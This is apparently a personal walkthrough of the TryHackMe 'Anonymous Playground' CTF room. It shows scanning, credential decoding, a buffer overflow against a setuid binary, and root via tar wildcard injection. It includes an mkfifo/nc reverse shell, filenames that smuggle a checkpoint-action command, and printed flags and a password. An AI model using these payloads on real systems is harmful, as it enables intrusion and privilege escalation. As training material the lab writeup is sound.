----
Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?
----

### Task 1  Prove Yourself

 Start Machine

![](http://clipart-library.com/images_k/transparent-anonymous-mask/transparent-anonymous-mask-18.png)

  

So, you've decided to sign up with Anonymous? Well, it won't be that easy. They've constructed a vulnerable CTF machine for

you to hack your way into and prove you have what it takes to become a member of Anonymous. Can you do it? Do you have

what it takes?

  

There's 3 flags on this machine. Two will be users, the other user will be the almighty root.

  

_I have to credit Robin for his insane dedication to helping me with all of my RE and Binex questions. Without his patience,_

_I would have never been able to create this room the way I had imagined it. So thank you sir._

_Also credit goes to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the super special idea found in the initial foothold stage (not going to give any_

_spoilers away!)_

**Please allow 3-5 minutes for the box to fully deploy once you hit the "Deploy" button.**

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ rustscan -a 10.10.4.129 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.4.129:22
Open 10.10.4.129:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 12:18 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:18
Completed Parallel DNS resolution of 1 host. at 12:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:18
Scanning 10.10.4.129 [2 ports]
Discovered open port 80/tcp on 10.10.4.129
Discovered open port 22/tcp on 10.10.4.129
Completed Connect Scan at 12:18, 0.23s elapsed (2 total ports)
Initiating Service scan at 12:18
Scanning 2 services on 10.10.4.129
Completed Service scan at 12:18, 6.66s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.4.129.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 7.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for 10.10.4.129
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-09 12:18:28 EDT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 60b6ad4c3ef9d2ec8bcd3b45a5ac5f83 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClu8XpXBiUw2g/nBt/VCfEYLS9n4kdaezLUivhTwOHhkpWu1/CVRlfjyAAWDFzuv/lFgPsqA9IYk9BQGIleQjfZ1RyEdLen0CdPmEE3pBSKvKgr+tdHtz9LSYX6WUZ2ji1vX1RUzOj5gM1tjNlqg53DipjHSiWS5XMC+Gmjgm+Tdaqi5RjxyHxxcD5LbEZT3rhK5anNnv93w03wq0wOb475KgYwmlUSQ7C5LgdtGPiUOFy5f6J4G9mznBRrlocKprxCTQywuVP6xc3FDMYzYDlAfgZrQqVUy9N69gqdycI5AqJv+ubx9ulAHyLCFG5S+vo8GGrEor/rle7ETLHlMWj
|   256 6f9abedffc95a2318fdbe5a2da8a0c3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+wRuTZ27V4CxgVdb1LCsbpO2jPP3Nen/ABkVFgegXA2cUnpZEhD3lBBub2fIMl6P2XXJ0+rJD3n0HqQu6PYUI=
|   256 e6985249cff2b865d7411c832e942488 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO/maijr14RO05c5UzlXFjTmaqvRYDY2JyhvVbeBPC3R
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Proving Grounds
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-favicon: Unknown favicon MD5: 533ABADAA92DA56EA5CB1FE4DAC5B47E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds

We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
Expect us. 

http://10.10.4.129/robots.txt

http://10.10.4.129/zYdHuAKjP/

You have not been granted access.
Access denied. 

changed denied to granted and I get 

hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN

**#** **EXAMPLE 1**  
'z' = 26 # 26th letter in the alphabet  
'A' = 1 # 1st letter in the alphabet(26 + 1) % 26 = 1 = 'a'**# EXAMPLE 2**  
'h' = 8  
'E' = 5(8 + 5) % 26 = 13 = 'm'N.B. Mod (i.e. '**%**') 26 is used since there are only 26 letters in the alphabet.

┌──(witty㉿kali)-[~/Downloads]
└─$ cat anonymous.py 
def moves(str):
	l1 = []
	for i in str:
		l1.append((ord(i) & 31))

	res = []
	for ele in range(0, len(l1), 2):
		res.append((l1[ele] + l1[ele +1]) % 26)
	
	for i in range(len(res)):
		print(chr(res[i] + 64).lower(), end=" ")

str1 = "hEzAdCfHzA"
moves(str1)
print("::", end=" ")
str2 = "hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"
moves(str2)
                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 anonymous.py
m a g n a :: m a g n a i s a n e l e p h a n t  

┌──(witty㉿kali)-[~/Downloads]
└─$ cat an1.py      
def moves(string):
    l1 = []
    for char in string:
        l1.append(ord(char) & 31)

    res = []
    for i in range(0, len(l1), 2):
        res.append((l1[i] + l1[i+1]) % 26)

    decoded_string = ''
    for position in res:
        decoded_string += chr(position + 96)

    return decoded_string

str1 = "hEzAdCfHzA"
decoded_str1 = moves(str1)

str2 = "hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"
decoded_str2 = moves(str2)

print(decoded_str1 + "::" + decoded_str2)

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 an1.py
magna::magnaisanelephant

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh magna@10.10.4.129                            
The authenticity of host '10.10.4.129 (10.10.4.129)' can't be established.
ED25519 key fingerprint is SHA256:zKvTLbgKsGoKUlP7w/r2yJkjWulPOJtp0DhBDy/GlFQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.4.129' (ED25519) to the list of known hosts.
magna@10.10.4.129's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  9 17:07:07 UTC 2023

  System load:  0.0                Processes:           97
  Usage of /:   22.9% of 19.56GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.4.129
  Swap usage:   0%


3 packages can be updated.
0 updates are security updates.


Last login: Fri Jul 10 13:54:20 2020 from 192.168.86.65
magna@anonymous-playground:~$ id;ip a
uid=1001(magna) gid=1001(magna) groups=1001(magna)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:92:b5:fa:9f:1b brd ff:ff:ff:ff:ff:ff
    inet 10.10.4.129/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2366sec preferred_lft 2366sec
    inet6 fe80::92:b5ff:fefa:9f1b/64 scope link 
       valid_lft forever preferred_lft forever
magna@anonymous-playground:~$ ls
flag.txt  hacktheworld  note_from_spooky.txt
magna@anonymous-playground:~$ cat flag.txt
9184177ecaa83073cbbf36f1414cc029
magna@anonymous-playground:~$ cat note_from_spooky.txt 
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky

┌──(witty㉿kali)-[~/Downloads]
└─$ scp magna@10.10.4.129:/home/magna/hacktheworld .
magna@10.10.4.129's password: 
hacktheworld                                         100% 8528    11.8KB/s   00:00  

┌──(witty㉿kali)-[~/Downloads]
└─$ file hacktheworld                                       
hacktheworld: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7de2fcf9c977c96655ebae5f01a013f3294b6b31, not stripped


using ghidra

undefined8 main(void)

{
  char local_48 [64];
  
  printf("Who do you want to hack? ");
  gets(local_48);
  return 0;
}

void call_bash(void)

{
  puts("\nWe are Anonymous.");
  sleep(1);
  puts("We are Legion.");
  sleep(1);
  puts("We do not forgive.");
  sleep(1);
  puts("We do not forget.");
  sleep(1);
  puts("[Message corrupted]...Well...done.");
  setuid(0x539);
  system("/bin/sh");
  return;
}

buffer overflow

magna@anonymous-playground:~$ ./hacktheworld 
Who do you want to hack? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
Segmentation fault (core dumped)

magna@anonymous-playground:~$ python -c 'print "A"*71' | ./hacktheworld
Who do you want to hack?

magna@anonymous-playground:~$ python -c 'print "A"*72' | ./hacktheworld
Segmentation fault (core dumped)


magna@anonymous-playground:~$ readelf -s hacktheworld | grep -i "call_bash"
    50: 0000000000400657   129 FUNC    GLOBAL DEFAULT   13 call_bash

magna@anonymous-playground:~$ python -c 'print "A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"' | ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
Segmentation fault (core dumped)

magna@anonymous-playground:~$ (python -c 'print "A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"' ; cat) | ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
whoami
Segmentation fault (core dumped)
magna@anonymous-playground:~$ (python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"' ; cat) | ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
whoami
spooky
python -c 'import pty; pty.spawn("/bin/sh")'
$ id
id
uid=1337(spooky) gid=1001(magna) groups=1001(magna)
$ cd /home
cd /home
$ ls
ls
dev  magna  spooky
$ cd spooky
cd spooky
$ ls
ls
flag.txt
$ cat flag.txt
cat flag.txt
69ee352fb139c9d0699f6f399b63d9d7
spooky@anonymous-playground:/home/spooky$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 *   * * *	root	cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
#

tar wild injection

spooky@anonymous-playground:/home/spooky$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
spooky@anonymous-playground:/home/spooky$ echo ""> "--checkpoint-action=exec=sh shell.sh"
shell.sh""--checkpoint-action=exec=sh s
spooky@anonymous-playground:/home/spooky$ echo ""> --checkpoint=1
echo ""> --checkpoint=1
spooky@anonymous-playground:/home/spooky$ ls -l
ls -l
total 16
-rw-rw-r-- 1 spooky magna   1 Jul  9 17:29 '--checkpoint=1'
-rw-rw-r-- 1 spooky magna   1 Jul  9 17:29 '--checkpoint-action=exec=sh shell.sh'
-r-------- 1 spooky spooky 33 Jul  4  2020  flag.txt
-rw-rw-r-- 1 spooky magna  74 Jul  9 17:28  shell.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.4.129] 42276
sh: 0: can't access tty; job control turned off
# cd /root
# ls
flag.txt
# cat flag.txt
bc55a426e98deb673beabda50f24ce66

another way to exploit buffer overflow

magna@anonymous-playground:~$ gdb hacktheworld
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from hacktheworld...(no debugging symbols found)...done.
(gdb) r < <(cyclic 100)
Starting program: /home/magna/hacktheworld < <(cyclic 100)
/bin/bash: cyclic: command not found


──(witty㉿kali)-[~/Downloads]
└─$ export PATH="$PATH:/home/witty/.local/bin"
                                                                                            
┌──(witty㉿kali)-[~/Downloads]
└─$ cyclic 60                                 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/witty/.cache/.pwntools-cache-3.11/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.9.0 --> 4.10.0).
    Update with: $ pip install -U pwntools
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt install gdb-peda

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/longld/peda.git ~/peda
Cloning into '/home/witty/peda'...
remote: Enumerating objects: 382, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 382 (delta 2), reused 8 (delta 2), pack-reused 373
Receiving objects: 100% (382/382), 290.84 KiB | 1.09 MiB/s, done.
Resolving deltas: 100% (231/231), done.
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ echo "source ~/peda/peda.py" >> ~/.gdbinit
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ gdb hacktheworld                                   
GNU gdb (Debian 13.1-2) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 136 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from hacktheworld...
(No debugging symbols found in hacktheworld)
------- tip of the day (disable with set show-tips off) -------
Use the vmmap instruction for a better & colored memory maps display (than the GDB's info proc mappings)
gdb-peda$ 

┌──(witty㉿kali)-[~/Downloads]
└─$ cat ~/.gdbinit   
source /home/witty/Downloads/pwndbg/gdbinit.py
source ~/peda/peda.py

if I want to use pwndbg tool just remove it :)

https://habr.com/en/articles/551500/

┌──(witty㉿kali)-[~/Downloads]
└─$ gdb hacktheworld                                   
GNU gdb (Debian 13.1-2) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 136 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from hacktheworld...
(No debugging symbols found in hacktheworld)
------- tip of the day (disable with set show-tips off) -------
Use the vmmap instruction for a better & colored memory maps display (than the GDB's info proc mappings)
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /home/witty/Downloads/hacktheworld 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Who do you want to hack? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.


[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x7fffffffde68 --> 0x7fffffffe1cf ("/home/witty/Downloads/hacktheworld")
RCX: 0x7ffff7f96a80 --> 0xfbad2288 
RDX: 0x1 
RSI: 0x1 
RDI: 0x7ffff7f98a20 --> 0x0 
RBP: 0x4141334141644141 ('AAdAA3AA')
RSP: 0x7fffffffdd58 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x40070f (<main+55>:	ret)
R8 : 0x602715 --> 0x0 
R9 : 0x0 
R10: 0x1000 
R11: 0x246 
R12: 0x0 
R13: 0x7fffffffde78 --> 0x7fffffffe1f2 ("TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db22c73a993ff0b42f64b396873")
R14: 0x0 
R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2e0 --> 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400704 <main+44>:	call   0x400540 <gets@plt>
   0x400709 <main+49>:	mov    eax,0x0
   0x40070e <main+54>:	leave
=> 0x40070f <main+55>:	ret
   0x400710 <__libc_csu_init>:	push   r15
   0x400712 <__libc_csu_init+2>:	push   r14
   0x400714 <__libc_csu_init+4>:	mov    r15,rdx
   0x400717 <__libc_csu_init+7>:	push   r13
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd58 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdd60 ("AJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffdd68 ("AAKAAgAA6AAL")
0024| 0x7fffffffdd70 --> 0x4c414136 ('6AAL')
0032| 0x7fffffffdd78 --> 0x7fffffffde68 --> 0x7fffffffe1cf ("/home/witty/Downloads/hacktheworld")
0040| 0x7fffffffdd80 --> 0x7fffffffde68 --> 0x7fffffffe1cf ("/home/witty/Downloads/hacktheworld")
0048| 0x7fffffffdd88 --> 0x2ac6fdd63d3cb82a 
0056| 0x7fffffffdd90 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040070f in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────
 RAX  0x0
*RBX  0x7fffffffde68 —▸ 0x7fffffffe1cf ◂— '/home/witty/Downloads/hacktheworld'
*RCX  0x7ffff7f96a80 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RDX  0x1
*RDI  0x7ffff7f98a20 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x1
*R8   0x602715 ◂— 0x0
 R9   0x0
*R10  0x1000
*R11  0x246
 R12  0x0
*R13  0x7fffffffde78 —▸ 0x7fffffffe1f2 ◂— 'TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db22c73a993ff0b42f64b396873'
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x4141334141644141 ('AAdAA3AA')
*RSP  0x7fffffffdd58 ◂— 'IAAeAA4AAJAAfAA5AAKAAgAA6AAL'
*RIP  0x40070f (main+55) ◂— ret 
───────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────
 ► 0x40070f <main+55>    ret    <0x4134414165414149>










─────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ rsp 0x7fffffffdd58 ◂— 'IAAeAA4AAJAAfAA5AAKAAgAA6AAL'
01:0008│     0x7fffffffdd60 ◂— 'AJAAfAA5AAKAAgAA6AAL'
02:0010│     0x7fffffffdd68 ◂— 'AAKAAgAA6AAL'
03:0018│     0x7fffffffdd70 ◂— 0x4c414136 /* '6AAL' */
04:0020│     0x7fffffffdd78 —▸ 0x7fffffffde68 —▸ 0x7fffffffe1cf ◂— '/home/witty/Downloads/hacktheworld'
05:0028│     0x7fffffffdd80 —▸ 0x7fffffffde68 —▸ 0x7fffffffe1cf ◂— '/home/witty/Downloads/hacktheworld'
06:0030│     0x7fffffffdd88 ◂— 0x2ac6fdd63d3cb82a
07:0038│     0x7fffffffdd90 ◂— 0x0
───────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► f 0         0x40070f main+55
   f 1 0x4134414165414149
   f 2 0x3541416641414a41
   f 3 0x41416741414b4141
   f 4       0x4c414136
   f 5   0x7fffffffde68
   f 6   0x7fffffffde68
   f 7 0x2ac6fdd63d3cb82a
───────────────────────────────────────────────────────────────────────────────────
gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 64
Registers point to pattern buffer:
[RSP] --> offset 72 - size ~28
Pattern buffer found at:
0x006026b0 : offset    0 - size  100 ([heap])
0x00007fffffffdd10 : offset    0 - size  100 ($sp + -0x48 [-18 dwords])
References to pattern buffer found at:
0x00007ffff7f96a98 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7f96aa0 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7f96aa8 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7f96ab0 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7f96ab8 : 0x006026b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007fffffffdae8 : 0x006026b0 ($sp + -0x270 [-156 dwords])
0x00007fffffffd960 : 0x00007fffffffdd10 ($sp + -0x3f8 [-254 dwords])
0x00007fffffffdc88 : 0x00007fffffffdd10 ($sp + -0xd0 [-52 dwords])

Now we have the legth of the junk that we can input before we reach the RIP, that is 72 (64 + 8 of the RBP which is before of the IP). After this we can analyse the binary itself with radare2


┌──(witty㉿kali)-[~/Downloads]
└─$ r2 -d hacktheworld  
[0x7f12a68129c0]> aaa  <---in-depth analysis
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7f12a68129c0]> afl <--- list all the functionss
0x00400570    1 43           entry0
0x004005b0    4 42   -> 37   sym.deregister_tm_clones
0x004005e0    4 58   -> 55   sym.register_tm_clones
0x00400620    3 34   -> 29   sym.__do_global_dtors_aux
0x00400650    1 7            entry.init0
0x00400780    1 2            sym.__libc_csu_fini
0x00400784    1 9            sym._fini
0x00400657    1 129          sym.call_bash
0x00400510    1 6            sym.imp.puts
0x00400560    1 6            sym.imp.sleep
0x00400550    1 6            sym.imp.setuid
0x00400520    1 6            sym.imp.system
0x00400710    4 101          sym.__libc_csu_init
0x004005a0    1 2            sym._dl_relocate_static_pie
0x004006d8    1 56           main
0x00400530    1 6            sym.imp.printf
0x00400540    1 6            sym.imp.gets
0x004004e0    3 23           sym._init
[0x7f12a68129c0]> s sym.call_bash <-- select
[0x00400657]> pdf <--see
┌ 129: sym.call_bash ();
│           0x00400657      55             push rbp
│           0x00400658      4889e5         mov rbp, rsp
│           0x0040065b      488d3d360100.  lea rdi, str._nWe_are_Anonymous. ; 0x400798 ; "\nWe are Anonymous."
│           0x00400662      e8a9feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400667      bf01000000     mov edi, 1
│           0x0040066c      e8effeffff     call sym.imp.sleep          ; int sleep(int s)
│           0x00400671      488d3d330100.  lea rdi, str.We_are_Legion. ; 0x4007ab ; "We are Legion."
│           0x00400678      e893feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040067d      bf01000000     mov edi, 1
│           0x00400682      e8d9feffff     call sym.imp.sleep          ; int sleep(int s)
│           0x00400687      488d3d2c0100.  lea rdi, str.We_do_not_forgive. ; 0x4007ba ; "We do not forgive."
│           0x0040068e      e87dfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400693      bf01000000     mov edi, 1
│           0x00400698      e8c3feffff     call sym.imp.sleep          ; int sleep(int s)
│           0x0040069d      488d3d290100.  lea rdi, str.We_do_not_forget. ; 0x4007cd ; "We do not forget."
│           0x004006a4      e867feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006a9      bf01000000     mov edi, 1
│           0x004006ae      e8adfeffff     call sym.imp.sleep          ; int sleep(int s)
│           0x004006b3      488d3d260100.  lea rdi, str._Message_corrupted_...Well...done. ; 0x4007e0 ; "[Message corrupted]...Well...done."
│           0x004006ba      e851feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006bf      bf39050000     mov edi, 0x539              ; 1337
│           0x004006c4      e887feffff     call sym.imp.setuid
│           0x004006c9      488d3d330100.  lea rdi, str._bin_sh        ; 0x400803 ; "/bin/sh"
│           0x004006d0      e84bfeffff     call sym.imp.system         ; int system(const char *string)
│           0x004006d5      90             nop
│           0x004006d6      5d             pop rbp
└           0x004006d7      c3             ret

0x004006bf bf39050000 mov edi, 0x539 <-- jump here 0x004006c4 e887feffff call sym.imp.setuid  
0x004006c9 488d3d330100. lea rdi, str._bin_sh  
0x004006d0 e84bfeffff call sym.imp.system

This is the interesting part because if you jump after the mov edi, 0x539 instruciton (that set the argument 1337 for the setuid), we can simply pop the argument “0” into the RDI which store the first argument on 64 bits (if you are not familiar with 64 bits take a look at the [calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions)). With this trick it will set the root user who is the 0 and call a bash with system that has as argument /bin/sh

┌──(witty㉿kali)-[~/Downloads]
└─$ cat anonymous_bof.py 
from pwn import *

remote = 1

if remote:
        ssh_session = ssh("magna","10.10.4.129",password='magnaisanelephant')
